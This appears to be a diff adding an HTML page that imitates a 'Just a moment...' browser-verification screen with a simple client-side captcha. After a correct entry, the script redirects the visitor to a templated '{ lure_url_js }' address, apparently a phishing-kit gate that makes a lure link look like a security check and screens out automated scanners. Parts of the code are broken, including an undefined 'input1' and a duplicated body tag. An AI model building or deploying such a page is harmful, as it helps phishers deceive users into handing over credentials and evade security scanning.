@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Just a moment...</title>
+    <!-- #region(collapsed) [CSS] -->
+    <style>
+      body {
+        background-color: rgb(7, 112, 209);
+        font-family: sans-serif;
+      }
+
+      .capt {
+        background-color: #ffffff;
+        width: 400px;
+        height: 200px;
+        border-radius: 5px;
+        position: absolute;
+        transform: translate(-50%, -50%);
+        top: 50%;
+        left: 50%;
+      }
+
+      #mainCaptcha {
+        position: relative;
+        max-width: 350px;
+        margin: auto;
+        margin: 20px;
+        padding: 10px;
+        user-select: none;
+        text-align: center;
+        box-shadow: 0 0 20px rgba(0, 139, 253, 0.25);
+      }
+
+      #refresh {
+        position: relative;
+        left: 300px;
+        width: 30px;
+        height: 50px;
+        bottom: 55px;
+        background-color: transparent;
+        outline: none;
+        background-image: url("https://img.icons8.com/android/24/000000/refresh.png");
+        border: 0;
+        background-repeat: no-repeat;
+      }
+
+      #txtInput,
+      #Button1 {
+        position: relative;
+        left: 40px;
+        padding: 10px 10px;
+        bottom: 40px;
+        font-size: 18px;
+      }
+
+      #txtInput {
+        border: 2px solid rgb(4, 82, 160);
+      }
+
+      #Button1 {
+        background-color: rgb(7, 59, 115);
+        border-color: rgb(7, 59, 115);
+        color: #fff;
+      }
+
+      #helpMsg {
+        color: black;
+        margin-left: 1em;
+      }
+    </style>
+    <!-- #endregion -->
+  </head>
+  <body>
+    <body onload="Captcha();">
+      <div class="capt">
+        <p id="helpMsg"><b>Enter the characters you see</b></p>
+
+        <h2 type="text" id="mainCaptcha"></h2>
+        <p><input type="button" id="refresh" onclick="Captcha();" /></p>
+        <input type="text" id="txtInput" />
+        <input id="Button1" type="button" value="Check" onclick="ValidateCaptcha();" />
+      </div>
+    </body>
+    <script>
+      function Captcha() {
+        var n,
+          a = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
+          o = a[Math.floor(Math.random() * a.length)],
+          e = a[Math.floor(Math.random() * a.length)],
+          t = o + " " + e + "  " + a[Math.floor(Math.random() * a.length)] + " " + a[Math.floor(Math.random() * a.length)]
+        ;(document.getElementById("mainCaptcha").innerHTML = t), (document.getElementById("mainCaptcha").value = t)
+      }
+      function ValidateCaptcha() {
+        var string1 = removeSpaces(document.getElementById("mainCaptcha").value)
+        var string2 = removeSpaces(document.getElementById("txtInput").value)
+        if (string1 == string2) {
+          input1.style.borderColor = ""
+          window.location.href = { lure_url_js } + window.location.hash
+          return true
+        } else {
+          input1.style.borderColor = "red"
+          return false
+        }
+      }
+      function removeSpaces(string) {
+        return string.split(" ").join("")
+      }
+    </script>
+  </body>
+</html>
